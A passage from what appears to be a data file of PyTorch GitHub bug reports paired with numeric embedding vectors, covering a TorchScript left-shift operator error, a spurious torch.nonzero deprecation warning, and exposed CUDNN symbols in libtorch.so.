  6.40417516e-01 -5.67982495e-01 -4.34788257e-01 -4.59600121e-01
  2.05590278e-01 -8.63490701e-01 -2.58033812e-01  1.23985909e-01
  1.17862903e-01 -1.70698121e-01 -1.79300427e-01 -5.92373498e-02
  5.25666535e-01  7.59906694e-02  2.35861585e-01  2.94839650e-01
 -4.10050526e-02 -2.82081425e-01 -4.11476016e-01 -1.23569101e-01
 -3.92384499e-01 -2.72757828e-01  2.13762045e-01  4.86676872e-01
  1.31667539e-01  3.74738991e-01  4.06149805e-01 -3.53328347e-01
 -1.12542054e-02  6.58212602e-02  2.03544050e-02  7.35669136e-02
  7.49655534e-03  1.41297668e-01  1.54188842e-01 -9.72121209e-02
 -3.60420167e-01  1.87551960e-01  4.67934936e-01  5.20139635e-01
 -6.21087193e-01 -1.10826857e-01 -1.87577993e-01  1.23529896e-01
 -2.41345316e-01  2.08053529e-01 -3.60074043e-01 -6.15632772e-01
  2.72146165e-01 -2.83161521e-01 -1.01492882e-01 -3.99407595e-02
 -4.05810326e-01  9.64326598e-03 -3.02871078e-01 -2.17844978e-01
 -5.08889556e-01 -1.29045248e-02  2.84507155e-01 -1.67823449e-01
  2.62344535e-03  1.70264170e-01  6.23848915e-01 -3.31628352e-01
 -3.17620710e-02  1.05715916e-01  2.62065798e-01 -2.49040425e-02
  3.97640556e-01 -3.05279672e-01 -1.63113594e-01 -2.27969587e-01
 -5.58876097e-01  2.52303243e-01  4.60046008e-02 -3.62353742e-01
 -3.57581377e-01 -3.27863246e-01  1.39843244e-02 -2.88192868e-01
 -3.57050687e-01 -7.20481873e-01 -2.00870335e-01  2.97715545e-01
  5.28517008e-01  7.23880112e-01 -1.77347958e-01 -4.62171659e-02
  1.06680550e-01  4.04991284e-02 -4.58480045e-02 -4.69959080e-01
  1.39056563e-01 -4.53081429e-01 -4.79046464e-01 -1.64284050e-01
  1.77751020e-01  4.67976242e-01  5.24629802e-02  2.41045833e-01
  2.95385033e-01  3.65698695e-01  1.58888012e-01 -3.92752979e-03
 -3.41353565e-02  9.07820165e-02 -3.91259342e-02  1.60161048e-01
  4.06223573e-02  2.82273442e-01 -4.42432553e-01 -3.15249443e-01
  2.52345443e-01  7.20783770e-02 -4.94959593e-01 -2.90993631e-01
 -4.30509120e-01 -2.93324068e-02  3.24182492e-03  2.14500293e-01
 -1.26710147e-01 -2.08029851e-01 -1.39793558e-02 -4.24775600e-01
  7.82544434e-01 -1.40366077e-01  1.49030894e-01 -5.48090160e-01
 -5.60561121e-02  2.92750210e-01  1.78765088e-01  3.78580764e-02
  3.58720124e-01  2.44835690e-01 -1.07332557e-01 -3.66936207e-01
 -9.09836590e-02 -3.07332836e-02 -1.41433388e-01  3.97811413e-01
  6.28624439e-01 -7.55887330e-02 -1.38531730e-01  3.39883864e-01
  2.31393091e-02  2.09670216e-01  2.51663268e-01 -5.95940053e-02
 -3.17617714e-01  5.04234076e-01 -8.65942776e-01 -1.54507279e-01
 -3.82338822e-01 -1.99974835e-01  3.60173851e-01  7.63870776e-04
 -3.50810528e-01 -1.45074978e-01  7.80477524e-01 -3.79693806e-01
 -2.32345447e-01  2.08760187e-01  2.35797718e-01 -2.03866482e-01
  1.68447822e-01  4.58292514e-02  2.73054540e-01  4.63980556e-01
 -9.66522768e-02 -3.17939639e-01 -1.88494056e-01  2.18458951e-01
 -7.83314854e-02 -9.95918661e-02  6.66396320e-02 -4.76265028e-02
  4.88144904e-01  3.63093376e-01 -2.03336358e-01  6.05724305e-02
  1.39506623e-01 -4.20860536e-02  2.88880050e-01 -3.40433896e-01
  6.07666746e-02  7.51182079e-01  7.28238374e-02  5.51814556e-01
  2.26477772e-01 -1.53091401e-01  7.89662004e-02 -4.70584333e-02
 -4.07817602e-01 -3.00030291e-01 -1.91632375e-01  1.33902252e-01
  4.90746439e-01 -4.19859588e-01 -2.76373982e-01  5.23348331e-01
  3.70110631e-01  3.28804776e-02 -2.15160832e-01  2.50890464e-01
 -2.18321532e-01 -3.48174945e-02  3.81805271e-01 -1.95403591e-01
 -1.95527881e-01 -2.21753642e-01 -1.62034675e-01  8.41928571e-02
  3.90888691e-01 -5.11733770e-01  7.23106921e-01  9.70437080e-02
 -3.01134557e-01  1.68594435e-01 -2.71829009e-01 -1.46779567e-01
  2.42619008e-01  4.37650979e-01 -2.16567889e-03  7.44632781e-02
  1.01269752e-01 -3.53019565e-01 -1.03962585e-01  3.39872181e-01
  8.74191895e-02  2.10551769e-01 -2.61493653e-01  4.62534308e-01
  1.17289215e-01 -6.56897426e-02 -1.68796405e-02  2.75571376e-01
  2.51653165e-01  4.54060175e-02 -1.35724217e-01 -2.00373679e-01
 -1.32416815e-01  5.68269730e-01  2.78446436e-01 -1.66964963e-01
  4.95218784e-02 -2.65349865e-01  2.50200450e-01 -2.51218259e-01
 -4.15432245e-01 -2.20729589e-01  3.91030788e-01  5.31577468e-02
 -6.62623346e-02  1.53206125e-01  1.55496508e-01  7.21410662e-02
  2.63404608e-01  3.39241087e-01 -2.47399807e-01  5.94114184e-01
 -1.95728242e-01  9.99517888e-02  1.77881524e-01  1.59494489e-01
 -1.82931885e-01  5.94895743e-02 -4.46968079e-02 -2.55427539e-01
 -3.71076643e-01  3.44102263e-01 -3.22475791e-01 -5.41267768e-02
 -1.29651561e-01  3.89983028e-01  4.37106900e-02  8.93112272e-02
  3.46454799e-01  8.88606012e-02  3.01816642e-01 -8.68085101e-02
 -3.32600355e-01  2.88405061e-01  7.57414758e-01 -2.49511600e-01
  1.47521347e-01  5.27159199e-02 -3.42950940e-01 -1.77477486e-02]"
JIT does not support binary operators oncall: jit triaged,"## ðŸ› Bug

I have a code that looks like this
```
import torch as tc
from torch import jit
@jit.script
def func(inp):
    return inp<<1
a = tc.tensor([3,4,5])
func(a)
```
when I run it, I got the error:
```
torch.jit.frontend.NotSupportedError: unsupported binary operator: LShift:
  File ""example.py"", line 5
@jit.script
def func(inp):
    return inp<<1
              ~~ <--- HERE
```
However, if I change `inp<<1` to `inp.__lshift__(1)`, it works. This also happens in C++.

## Expected behavior

I expect the binary operators to work without changing them to the call to methods.

## Environment

PyTorch version: 1.4.0+cpu
Is debug build: No
CUDA used to build PyTorch: None

OS: Microsoft Windows 10 Home
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.16.3
[pip3] torch==1.4.0+cpu
[pip3] torchvision==0.5.0+cpu
[conda] Could not collect
## Additional context

It is not a very severe problem and I would like to fix it if I know where the source code is located.


cc @suo",True,"[-0.5937347  -0.07970514 -0.07375972 -0.01483213  0.05737565 -0.31439185
  0.1744082   0.38635463 -0.33129662 -0.00431608 -0.01789379 -0.23764287
 -0.38627368  0.14752646  0.26590884 -0.03679763 -0.24290945 -0.26623487
 -0.01103665 -0.11343649  0.04682181 -0.1928251  -0.04696996 -0.07382616
 -0.06670517  0.02877001 -0.07353045  0.07887605  0.269917    0.05643348
  0.07472301  0.08672695 -0.57507914 -0.0657182   0.13039666  0.13699284
 -0.19846627  0.01976988 -0.04489157 -0.21872123  0.18076454  0.17101759
  0.14497899 -0.15266925  0.12193978 -0.1672776  -0.0688549   0.18189615
 -0.18530458 -0.19959411 -0.0478963   0.24188358 -0.10109344  0.0588321
  0.16843817 -0.25196308 -0.34633923  0.12916599  0.18785062 -0.10433564
 -0.05741089  0.06939544  0.01083762 -0.03786956  0.04789214 -0.16699302
 -0.02056263 -0.03520896  0.47216243 -0.2747327  -0.03968079  0.08008689
  0.05503014  0.19918886  0.10039923 -0.05411417 -0.4086551   0.23960574
 -0.34998056 -0.06604688  0.2196835  -0.10203712  0.19702393 -0.03844653
  0.16657397  0.15032724 -0.04839053 -0.14736007  0.36331654  0.28304803
  0.00580307  0.08030441 -0.06016244  0.24335374  0.02669305 -0.06364749
  0.5011621  -0.0180995  -0.3456759  -0.2538702  -0.0085009  -0.45421606
 -0.00455773  0.2719354   0.32236436  0.09415101  0.20775428  0.29829228
  0.27909416 -0.40394628  0.12086749  0.24820876 -0.15046522 -0.41620454
 -0.09140816 -0.1183222  -0.40952152 -0.2564247   0.03516692  0.26124105
 -0.07887622  0.08776712 -0.12258574  0.28162235  0.34496674  0.20011905
 -0.09590842 -0.12831858 -0.16098516  0.21817565  0.19805846  0.1287033
  0.13425133 -0.11243116  0.5232469  -0.03422487 -0.5816411   0.20904207
 -0.19429505 -0.31099156 -0.11181846 -0.10349412  0.08481959 -0.17120868
 -0.1690687  -0.46702778 -0.02667459  0.15939745  0.02097938 -0.09217605
 -0.14638177  0.10265744 -0.41436538  0.5339205   0.00746622  0.06282755
  0.40755773 -0.00460912  0.18085563 -0.3004691   0.4725399   0.2387416
  0.09020204 -0.22403783  0.3341599  -0.08485331 -0.13491252  0.14787541
 -0.5577209   0.06989385 -0.2063775  -0.1710539  -0.14077023 -0.21248862
  0.25356233  0.0707735   0.1361137  -0.26287076 -0.06998386  0.49697933
  0.6215112   0.37861073  0.41574812  0.06602719 -0.00152191  0.16830665
  0.17628129  0.17985407 -0.01810513 -0.14703533 -0.46317708 -0.13282113
  0.0400224  -0.10174378  0.15054265 -0.01521031 -0.11008298 -0.00623985
 -0.15227965 -0.02559822 -0.07854557  0.11462524  0.1619058  -0.01559914
 -0.01644501  0.12433831 -0.1859501  -0.19418822 -0.2396915  -0.08232699
 -0.2867907  -0.03035943 -0.17876443 -0.18093435 -0.01302071 -0.01002558
  0.233253   -0.19108391  0.10999521  0.19472647  0.34421733  0.00889923
  0.002224   -0.09042025  0.15286553  0.3641894  -0.10020147 -0.16255169
 -0.09913265 -0.20719865  0.25966316 -0.6095889   0.47190154 -0.03558923
  0.17665915  0.34865558 -0.03896287 -0.07899234 -0.05281721  0.27506152
 -0.29960755 -0.02351357  0.10005313 -0.2037289  -0.1138394  -0.09766613
 -0.21935579 -0.26879498 -0.04207505  0.25803274 -0.24685228  0.03939637
 -0.07929064  0.06265302  0.3444034   0.10722543  0.07265471 -0.12208682
 -0.1024649  -0.07126671 -0.24207905  0.4304805   0.09649209 -0.16984503
  0.05817229 -0.16240494 -0.09435304  0.28606147 -0.0685923   0.2683078
  0.06194913 -0.19483337  0.2226004   0.12639223  0.01813008  0.0234428
  0.41348186 -0.19822225 -0.02372531 -0.27275977  0.33243462  0.36474597
 -0.09929062  0.08287914  0.30030984 -0.27104646  0.12665646 -0.04124645
 -0.14932081 -0.25267503 -0.2742568  -0.20512134  0.46532965 -0.03637198
 -0.06297533 -0.17227185 -0.23407075 -0.1768998  -0.06903887  0.2139796
 -0.12640288  0.3310132   0.17108747  0.08042996  0.14080362  0.10063647
  0.05588864 -0.1026831   0.3240577  -0.17581476  0.1292375   0.17832275
 -0.17395788  0.04973251 -0.15904556  0.38703096 -0.02671991  0.35563868
  0.3039114   0.09355456 -0.02775297 -0.5000508  -0.55473745 -0.20946683
 -0.12524678  0.17937903 -0.34608486  0.03601855 -0.11723324  0.23009595
  0.15949667  0.20682791  0.04747792  0.18978679 -0.13718283 -0.41312963
 -0.07826747  0.34296703  0.11107147 -0.40065962 -0.34441572 -0.06011813
 -0.09574594 -0.14211702 -0.1587497  -0.20160985  0.20921919  0.0936182
 -0.07465245  0.18917741 -0.28657997 -0.02822799 -0.20926392  0.27746072
 -0.04439214  0.47273135 -0.1215941   0.09856731  0.19195776  0.10441807
  0.00544508  0.07507762 -0.30496657 -0.16438775  0.04956027 -0.02658595
  0.14414872 -0.11315656  0.28493413  0.11080258 -0.23639044 -0.00671598
 -0.19749326  0.10405497  0.26501584 -0.25670528 -0.17105624  0.06287286
  0.13062638 -0.21226788 -0.04830586  0.28294128  0.30027026 -0.05611232]"
torch.nonzero issues a DeprecationWarning for non-deprecated usages module: nn module: logging triaged module: deprecation,"## ðŸ› Bug

<!-- A clear and concise description of what the bug is. -->
Afaics any usage of `torch.nonzero` is producing a deprecation warning

## To Reproduce

```
In [1]: import torch

In [2]: t = torch.arange(2)

In [3]: torch.nonzero(t)
../torch/csrc/utils/python_arg_parser.cpp:738: UserWarning: This overload of nonzero is deprecated:
        nonzero(Tensor input, Tensor out)
Consider using one of the following signatures instead:
        nonzero(Tensor input, bool as_tuple)
Out[3]: tensor([[1]])
```

## Expected behavior

No deprecation warning

<!-- A clear and concise description of what you expected to happen. -->

## Environment

```
PyTorch version: 1.5.0a0+d2098bd
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
CMake version: version 3.16.1

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration:
GPU 0: TITAN RTX
GPU 1: TITAN RTX

Nvidia driver version: 440.33.01
cuDNN version: /usr/local/cuda-10.2.89/targets/x86_64-linux/lib/libcudnn.so.7

Versions of relevant libraries:
[pip] numpy==1.17.3
[pip] torch==1.5.0a0+d2098bd
[conda] mkl                       2019.5                      281    conda-forge
[conda] mkl-include               2019.5                      281    conda-forge
[conda] torch                     1.5.0a0+d2098bd           dev_0    <develop>
```


cc @albanD @mruberry",True,"[-5.71986079e-01  3.37082684e-01 -4.10000570e-02  5.75898886e-02
  2.30860054e-01 -1.74538419e-01  2.09913284e-01  1.90210223e-01
 -5.40326476e-01 -1.11208847e-02 -2.68363990e-02  6.24818280e-02
 -1.91122800e-01  6.72546681e-03  1.40444845e-01  1.05863556e-01
 -1.54875703e-02 -1.45229280e-01 -1.03570007e-01 -2.99714595e-01
  3.23174089e-01 -2.09103953e-02  1.94922704e-02  3.91062312e-02
 -5.07208705e-02  2.61323690e-01 -3.64722550e-01  9.11769569e-02
  3.75497371e-01  4.02883321e-01 -9.99224335e-02 -1.10192597e-03
 -7.92616963e-01  2.13380642e-02  2.66182542e-01 -2.20985979e-01
 -3.49637657e-01  2.05952793e-01 -2.00050026e-01 -1.32196084e-01
  1.95518315e-01  2.81497896e-01 -9.57614183e-02 -4.25413847e-02
 -3.03304017e-01 -6.10414445e-02 -1.31595582e-01  5.55830933e-02
 -4.25235629e-01 -3.69045645e-01  1.40456617e-01  2.88772702e-01
 -1.87609792e-01 -4.99780849e-03  3.96179378e-01 -4.06796843e-01
 -2.45646417e-01 -6.54764473e-03 -3.93439904e-02 -3.84959787e-01
  1.74408615e-01 -3.28981429e-02 -2.57980287e-01  5.69195673e-03
  1.85798794e-01 -3.24595496e-02  1.41436812e-02  2.95105159e-01
  4.98878896e-01  3.71834815e-01  8.66687074e-02 -1.56523049e-01
  8.88888687e-02  1.75644457e-01 -1.53508037e-01 -5.27945608e-02
 -2.58114696e-01  4.23139334e-01 -1.91755086e-01 -4.40458119e-01
  2.07957774e-01  1.76367044e-01  7.02360645e-03  1.49355650e-01
 -4.09918278e-02  1.46076709e-01  2.08207205e-01 -2.47904703e-01
  4.08397555e-01  1.71732724e-01 -2.19883084e-01 -3.14266533e-02
  2.57928699e-01  2.44807720e-01 -3.14321518e-01 -1.63177371e-01
  4.13493186e-01 -1.06672123e-02 -3.30904424e-01  5.71017675e-02
 -1.54899180e-01 -5.04860640e-01 -2.40866229e-01  2.59994924e-01
 -8.30131173e-02 -1.37683660e-01  3.71857435e-01  5.63748956e-01
  1.95676804e-01 -1.78313076e-01  3.41441572e-01  4.60575968e-02
 -1.49914771e-01 -2.64520973e-01 -1.38856262e-01 -2.44369388e-01
 -9.15279984e-02 -2.15120912e-01 -8.14266801e-02  4.13237184e-01
  3.34860027e-01  1.92927063e-01  1.49398834e-01  4.26037490e-01
  2.48363733e-01  7.20725767e-03  8.84295404e-02 -1.16588183e-01
  1.04611464e-01  1.96381122e-01 -7.45832622e-02  7.11978972e-02
 -8.41459408e-02  5.52007854e-02  5.73624313e-01  4.95629221e-01
 -2.06922963e-01  8.52078423e-02  3.07895064e-01  2.67841369e-01
 -2.94279248e-01  4.51389775e-02  1.52847469e-01 -9.52188224e-02
  1.38063759e-01 -3.90273064e-01  6.46769106e-02 -2.94303875e-02
  3.08284074e-01 -1.41164035e-01  1.25586241e-01  8.17276984e-02
 -4.15253460e-01  3.47003251e-01  1.19059414e-01 -1.09407291e-01
 -4.35922705e-02  1.15716748e-01  4.32342112e-01 -8.66173357e-02
  2.71399230e-01  5.66865765e-02  1.31992772e-01 -3.73524517e-01
  2.23412052e-01 -1.03915051e-01 -3.30695868e-01 -1.70490652e-01
 -5.43905735e-01 -3.83248888e-02 -6.33639172e-02 -3.80201787e-01
 -1.96671188e-01 -2.58052588e-01  2.01610044e-01 -2.07568586e-01
  3.50567326e-02 -2.14575320e-01 -7.03686625e-02  4.86081243e-01
  1.45712912e-01  3.55127811e-01  3.31075370e-01  1.55570418e-01
 -5.49416393e-02  1.51114255e-01  3.66953373e-01 -1.12614885e-01
  3.93139608e-02 -8.10201094e-02 -4.51691777e-01 -3.73529315e-01
  2.44091704e-01  6.26029447e-03  5.66184111e-02  2.35835582e-01
 -1.57112509e-01 -4.65073943e-01 -1.24278992e-01 -2.83154756e-01
 -2.59661116e-02  3.38981569e-01  7.37747774e-02 -1.27337933e-01
  1.92683697e-01  1.41048029e-01 -3.14977765e-01 -5.48483610e-01
 -4.86831665e-01 -8.79555941e-02 -2.45744079e-01 -1.48604080e-01
 -6.85606822e-02 -4.16502357e-01  2.42936015e-01 -1.12915793e-02
 -2.28590518e-01  2.80533284e-02  9.75925401e-02  4.77282643e-01
  3.28166336e-01 -2.53889132e-02 -1.90607727e-01 -2.25027651e-01
  1.00851059e-04  3.06096226e-01 -4.37652946e-01 -5.82141355e-02
 -2.33452246e-01 -8.99893865e-02 -3.19366187e-01 -4.19472426e-01
  3.27818006e-01  5.00455648e-02  5.26913665e-02  4.56975281e-01
  5.65123633e-02 -1.43915087e-01 -3.71636391e-01 -2.39933282e-02
 -8.86509120e-02 -2.26825237e-01  6.39423877e-02 -1.92843020e-01
 -1.03842087e-01  3.70608777e-01 -2.24779412e-01 -4.02626395e-01
 -3.84931892e-01  1.80259988e-01  4.30169981e-03  3.06465685e-01
 -1.40627041e-01 -2.74803694e-02  5.02037048e-01  3.66385698e-01
  1.89870119e-01 -3.23679894e-01 -1.10517487e-01 -8.13644454e-02
 -6.84902072e-02  2.37055689e-01 -7.15121850e-02  4.82735820e-02
  2.27465317e-01  2.60323640e-02 -1.27887651e-02  2.35203743e-01
 -2.75153995e-01 -1.64665520e-01 -2.07163453e-01 -3.57172459e-01
  3.88267159e-01  2.65740097e-01  2.77246088e-01 -4.56730425e-01
  1.64649814e-01 -7.72073045e-02 -8.70397836e-02 -3.81155312e-01
  3.36952448e-01  3.42364788e-01 -6.53903373e-03  1.94925889e-01
  5.49298346e-01 -2.03628063e-01 -2.76955128e-01  5.27409352e-02
 -9.56990942e-03 -2.88259923e-01 -2.35850126e-01  1.59351617e-01
  8.05337310e-01 -1.31933928e-01 -4.63609636e-01  1.05866402e-01
 -7.23313093e-02 -2.77803093e-01  2.61163432e-03  1.46992594e-01
  1.61497787e-01 -1.31270468e-01  2.89797246e-01 -2.46464670e-01
 -3.50212455e-01 -1.51935846e-01  1.41952664e-01 -3.49476069e-01
  6.89049184e-01 -4.98265266e-01 -6.52604252e-02  1.61035821e-01
 -9.82502401e-02  3.16773921e-01  1.18155582e-02  1.14587307e-01
 -3.26219022e-01  3.38555276e-01  2.44408339e-01 -7.19752982e-02
  6.64359629e-02 -1.39452308e-01 -7.19895065e-02  9.21953246e-02
 -2.36814655e-02  6.06158152e-02 -6.36986345e-02  5.93235418e-02
 -1.18848398e-01 -1.07702523e-01  1.83986217e-01 -1.95318803e-01
  1.59232453e-01  1.29189193e-01 -1.61488205e-01 -3.47086310e-01
  1.40137821e-01  4.59568262e-01 -1.86472893e-01 -3.79632235e-01
 -2.38285780e-01  3.97761725e-02 -1.82975695e-01 -2.59081479e-02
 -3.70736361e-01 -1.00849465e-01  3.02958488e-01 -3.87177050e-01
  8.32586586e-02  1.44618556e-01 -1.91373557e-01  2.65003383e-01
  2.67682433e-01  4.34089541e-01 -6.69277757e-02  4.78390783e-01
  1.17411964e-01  2.97213942e-01  5.02708666e-02  1.88458979e-01
  1.30138353e-01  1.90160900e-01 -3.62402976e-01 -1.46095872e-01
  2.31527500e-02  1.14877261e-01  1.18042290e-01 -9.11679193e-02
  6.17532358e-02  2.51879096e-01 -3.84716801e-02  5.04107028e-02
  3.92641127e-02  1.39969230e-01  2.05216467e-01 -1.85657680e-01
  2.50466228e-01 -3.64047103e-02  1.58000201e-01 -4.87212911e-02
  1.14939213e-01  9.88526940e-02 -3.25268298e-01  3.67933884e-02]"
PyTorch should hide CUDNN symbols in libtorch.so module: build module: cudnn triaged,"## ðŸ› Bug

PyTorch's `libtorch.so` exposes a lot of CUDNN API symbols. This causes issues when our application (independent from PyTorch) uses a different CUDNN version.

<!-- A clear and concise description of what the bug is. -->

## To Reproduce

Install PyTorch 1.4.0. Run `nm` on the `libtorch.so`, and there will be a lot of CUDNN API symbols.

```
nvpohanh@ubuntu:~$ nm /usr/local/lib/python3.5/dist-packages/torch/lib/libtorch.so | grep ' cudnnCreate'
000000000f479c30 T cudnnCreate
000000000f475ff0 T cudnnCreateActivationDescriptor
000000000f4747e0 T cudnnCreateAlgorithmDescriptor
000000000f474930 T cudnnCreateAlgorithmPerformance
000000000f473e90 T cudnnCreateConvolutionDescriptor
000000000f621a10 T cudnnCreateCTCLossDescriptor
000000000fc8cb50 T cudnnCreateDropoutDescriptor
000000000f47b3c0 T cudnnCreateFilterDescriptor
000000000f476460 T cudnnCreateLRNDescriptor
000000000f4752d0 T cudnnCreateOpTensorDescriptor
000000000fbe5520 T cudnnCreatePersistentRNNPlan
000000000f476af0 T cudnnCreatePoolingDescriptor
000000000f474f00 T cudnnCreateReduceTensorDescriptor
000000000fbe4f90 T cudnnCreateRNNDataDescriptor
000000000fbe3880 T cudnnCreateRNNDescriptor
000000000f475450 T cudnnCreateSpatialTransformerDescriptor
000000000f47aca0 T cudnnCreateTensorDescriptor
000000000f47cde0 T cudnnCreateTensorTransformDescriptor
```

## Expected behavior

PyTorch should hide CUDNN symbols in libtorch.so

<!-- A clear and concise description of what you expected to happen. -->

## Environment

```
Collecting environment information...
PyTorch version: 0.4.0
Is debug build: No
CUDA used to build PyTorch: 9.0.176

OS: Ubuntu 16.04.4 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.13.3

Python version: 2.7
Is CUDA available: Yes
CUDA runtime version: 10.2.89
GPU models and configuration: GPU 0: TITAN RTX
Nvidia driver version: 440.33.01
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] numpy==1.18.1
[pip] torch==1.4.0
[pip] torchvision==0.2.1
[conda] Could not collect
```

## Additional context

<!-- Add any other context about the problem here. -->


cc @csarofeen @ptrblck",True,"[-3.62824380e-01 -9.02676880e-02 -3.68957728e-01  7.13853613e-02
 -7.20682368e-03 -1.18978009e-01  1.40839130e-01 -3.23440194e-01
 -1.58275455e-01 -1.79377496e-01  1.36529669e-01 -7.24753067e-02
  2.11449251e-01 -1.53673023e-01 -1.11857451e-01  8.00565928e-02
 -2.57184446e-01 -2.67440118e-02  4.79098521e-02 -1.94790781e-01
 -9.46848392e-02  1.49903193e-01 -3.37477326e-02 -1.05362954e-02
  1.75132960e-01 -3.12804848e-01  4.21455540e-02 -2.26899862e-01
  2.85994768e-01 -4.99525480e-03  2.33544990e-01  1.59709543e-01
 -4.56722528e-02  1.34382725e-01  1.19746998e-01  1.72052756e-01
 -4.35717732e-01  9.51068848e-03  3.29751298e-02 -2.62800217e-01
 -2.12556645e-01  2.00463265e-01 -9.22966525e-02 -2.44300589e-02
 -2.27988467e-01 -2.09330499e-01  2.58037411e-02  9.39343348e-02
 -5.22217631e-01 -5.70458323e-02  3.54507565e-01 -1.54976733e-05
 -2.47409388e-01 -8.48827958e-02  1.55536145e-01 -2.05357462e-01
 -1.27299756e-01  2.25568786e-01 -2.53504157e-01  1.05228834e-01
  6.81900382e-02 -1.36515826e-01 -1.98150445e-02 -4.30409387e-02
  2.24328041e-02  4.63986933e-01 -6.91774637e-02 -1.81600124e-01
  3.45550418e-01 -3.35481882e-01  3.02020073e-01  2.82760441e-01
 -2.69956231e-01  4.90233675e-02  3.05602625e-02  2.33494341e-01
 -3.07629824e-01  3.27583134e-01 -2.96412617e-01 -1.45209491e-01
  1.25835538e-01  2.87973404e-01  2.65611142e-01 -5.96552491e-02
  7.11167827e-02  8.82723555e-02  1.82241991e-01 -2.35367924e-01
  1.18419230e-01 -6.91349655e-02  3.28671873e-01 -9.21786427e-02
 -1.46072835e-01  2.54444808e-01 -1.22403339e-01  2.19391473e-02
  1.43567815e-01  1.27120540e-01 -3.07694316e-01 -5.42824864e-02
 -1.37213338e-02 -2.69254744e-01 -4.67071563e-01  5.58966398e-01
  3.00502460e-02  1.33153796e-02  2.27026194e-01  1.29575491e-01
 -1.92033514e-01 -1.27519697e-01  1.81476668e-01 -1.08007297e-01
  2.54944324e-01 -6.29043505e-02  8.31858143e-02 -1.74556803e-02
  9.14662480e-02 -4.26923707e-02  1.40311912e-01  7.47033507e-02
  1.25261366e-01  3.60744178e-01  5.95621355e-02 -2.53830962e-02
  1.90974697e-01  2.11098239e-01 -4.77377288e-02 -1.39989853e-02
 -1.72542334e-02  3.19363207e-01 -1.55605584e-01  4.90618348e-02
  2.79647231e-01 -8.55823457e-02  2.89934725e-01 -1.21509165e-01
 -3.61320406e-01 -2.64333069e-01  7.41614848e-02 -1.59142643e-01
 -5.64181060e-02  3.92818563e-02  1.66337743e-01 -7.80636352e-03
  7.41271079e-02  1.91938877e-03 -3.72284427e-02  1.87157616e-01
  1.81423217e-01  1.27334088e-01 -2.02841699e-01  1.38156146e-01
 -3.04572821e-01  4.13277298e-01 -1.51660144e-02  1.86584234e-01
  9.96793658e-02 -8.29240233e-02  1.03922777e-01 -1.25292107e-01
  4.89182957e-02  2.17190176e-01  4.70433310e-02  1.21343359e-02
 -2.91160643e-01  1.93499357e-01 -1.58696771e-01 -3.67491096e-02
 -1.71263013e-02 -1.12971887e-01 -2.59771883e-01 -1.30421668e-01
  3.79252017e-01 -4.43013906e-01  2.39398479e-01 -1.95398137e-01
 -1.73354492e-01 -3.07178617e-01  3.03559631e-01  5.51268578e-01
  6.59806207e-02  4.30701792e-01  1.94311529e-01 -3.34192693e-01
  8.01276267e-02 -8.91050994e-02  1.28643438e-01  1.22988142e-01
  8.21384043e-02  2.02239916e-01 -9.51793119e-02 -5.97422272e-02
 -1.40448451e-01 -3.24148655e-01 -1.91306651e-01 -1.01903901e-01
 -1.30390465e-01  2.39014804e-01  7.59422407e-02 -4.92337160e-03
 -1.79530084e-01 -8.61687064e-02  3.95724550e-02  8.56017992e-02
  9.08903629e-02  5.22784367e-02 -1.39392406e-01 -3.72202814e-01
 -6.34165257e-02  5.27089164e-02 -5.10557771e-01 -2.76388586e-01
 -5.00999112e-03 -4.03923869e-01 -6.32695705e-02  1.11037523e-01
  1.20041147e-01 -7.78587312e-02  2.47993901e-01  3.73674095e-01
  5.92604578e-02 -6.88068867e-02 -1.17793620e-01 -3.11765969e-02
  1.96001709e-01  1.40051782e-01 -1.56628788e-01  3.90977859e-02
 -3.87536764e-01  1.51614055e-01 -2.70351321e-01 -3.38197321e-01
  1.59021497e-01  9.68819410e-02  8.51622075e-02  2.69320786e-01
 -5.70193268e-02 -1.83665529e-01  2.94738352e-01  1.86027393e-01
 -4.19108123e-02  2.14324936e-01 -2.08793610e-01 -9.78963971e-02
 -5.48383594e-02  2.12213799e-01 -3.04545730e-01 -1.92872286e-01
 -3.80581886e-01 -1.04909927e-01 -1.79280221e-01 -9.83126387e-02
  4.24829602e-01 -9.71200764e-02  2.63751209e-01 -6.09925240e-02
 -1.79012492e-02 -3.98274183e-01 -1.39237761e-01 -1.31632080e-02
  1.07786044e-01  1.18083313e-01 -1.34724364e-01  7.37481117e-02
  9.49751288e-02  1.63196512e-02 -1.34511292e-01  3.84326190e-01
 -6.50561452e-02 -1.11363083e-03  7.93330520e-02 -3.42183948e-01
  3.07386547e-01  3.71547565e-02  4.64712501e-01 -2.20381524e-02
  4.84304011e-01 -2.84434676e-01 -1.50559749e-02  4.20334265e-02
  5.71753904e-02  1.06738970e-01 -2.19111051e-02  1.39337778e-01
  3.17560673e-01 -2.06936017e-01 -2.85335869e-01 -8.57189149e-02
 -2.78220862e-01 -1.28880978e-01 -1.48600459e-01  5.29195547e-01
  3.35931897e-01 -2.18327552e-01 -6.43916875e-02  2.79816061e-01
 -3.78227383e-02 -1.66055523e-02 -1.30813405e-01  8.94461721e-02
  2.60305125e-03  2.17152253e-01 -7.47522861e-02  5.96947670e-02
 -1.24863751e-01  1.10430278e-01 -5.64031955e-03 -1.34165972e-01
  2.96333432e-01 -4.37897205e-01  1.64605901e-01  2.91648448e-01
 -1.91712767e-01  2.48690456e-01 -3.46247144e-02  1.09111473e-01
 -6.67249337e-02  2.94958681e-01  3.93435597e-01  1.25623003e-01
 -3.22966993e-01 -2.62526929e-01 -4.64168638e-01 -1.54391989e-01
  1.31388471e-01 -4.45640460e-02 -1.45798326e-01  1.07293669e-03
 -7.99865723e-02  2.26026386e-01  4.52674776e-02  1.31607205e-01
 -8.49227458e-02  8.84118453e-02  1.40701666e-01  2.96628386e-01
 -1.34761363e-01 -6.75682351e-02  1.21294588e-01 -1.54850602e-01
 -3.38823617e-01  9.15398002e-02 -2.51374785e-02 -3.06265682e-01
 -2.19832063e-01 -7.60679841e-02  1.54613435e-01  3.88782084e-01
 -1.61999077e-01  1.27205625e-01 -3.73184383e-02  6.14658520e-02
 -2.35427484e-01  8.59277323e-02  2.01945871e-01  1.40054911e-01
